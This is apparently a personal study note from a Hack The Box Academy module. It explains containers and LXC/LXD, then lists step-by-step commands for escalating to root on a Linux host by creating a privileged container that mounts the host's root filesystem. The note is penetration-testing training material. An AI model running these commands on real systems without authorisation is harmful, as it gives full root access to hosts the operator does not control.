
2026-05-14 16:31

Tags: #escalation  

## Containers

- **Containers** operate at the OS level. They share the host system's kernel but isolate application processes from the rest of the system.


- **Virtual Machines (VMs)** operate at the hardware level, allowing multiple distinct operating systems to run simultaneously on a single host.


- **Purpose:** Both provide crucial resource management and security. Isolation prevents applications (like web APIs) from escalating privileges and compromising the host system or databases.

## LXC and LXD Overview

- **Linux Containers (LXC):** *Application-level virtualization.* They consume fewer resources than VMs, offer high portability across clouds, and were heavily popularized by the Docker ecosystem.


- **Linux Daemon (LXD):** *System-level containers.* Unlike LXC, which typically isolates single applications, LXD is designed to contain and run a complete operating system.

## Privilege Escalation via LXC/LXD

- **The Prerequisite:** To exploit this vector, the compromised user account must be a member of the `lxc` or `lxd` group. You can verify this by running the `id` command.
	- ![[Pasted image 20260514164537.png]]


- **The Vulnerability:** Administrators frequently use *unconfigured or poorly secured container* templates for quick testing. Attackers can leverage these templates to create a highly privileged container that breaks system isolation.


- **The Exploitation Steps:**
    1. **Import a Template:** Find or upload a container template archive, then import it as an image.
        - `lxc image import ubuntu-template.tar.xz --alias ubuntutemp`
        - ![[Pasted image 20260514164735.png]]
          
    2. **Initialize a Privileged Container:** Create a new container from the imported image and explicitly disable its isolation features using the `security.privileged` flag.
        - `lxc init ubuntutemp privesc -c security.privileged=true`
        - ![[Pasted image 20260514164906.png]]
          
    3. **Mount the Host File System:** Add a device configuration that mounts the host system's root directory (`/`) into a specific path inside the container.
        - `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`
            
    4. **Execute the Container:** Start the malicious container and spawn a Bash shell inside it.
        - `lxc start privesc`
            
        - `lxc exec privesc /bin/bash`
        - ![[Pasted image 20260514164937.png]]
            
    5. **Access Host as Root:** Inside the container shell, navigate to the mounted path (e.g., `/mnt/root`) to freely access, view, and modify the underlying host system's files with root privileges.

## References:

https://academy.hackthebox.com/app/module/51/section/1588